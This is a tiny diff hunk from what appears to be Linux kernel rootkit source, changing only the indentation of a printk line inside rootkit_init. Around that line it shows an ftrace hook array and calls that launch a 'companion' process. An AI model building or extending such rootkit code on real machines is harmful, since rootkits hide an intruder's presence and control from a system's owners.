@@ -11,7 +11,7 @@ static t_ftrace_hook *f_hook[] = {&(t_ftrace_hook){
 }, NULL};
 
 static int __init rootkit_init(void) {
-    printk(KERN_INFO "%i\n", current->pid);
+  printk(KERN_INFO "%i\n", current->pid);
 
   launch_companion();
   get_pid_companion();
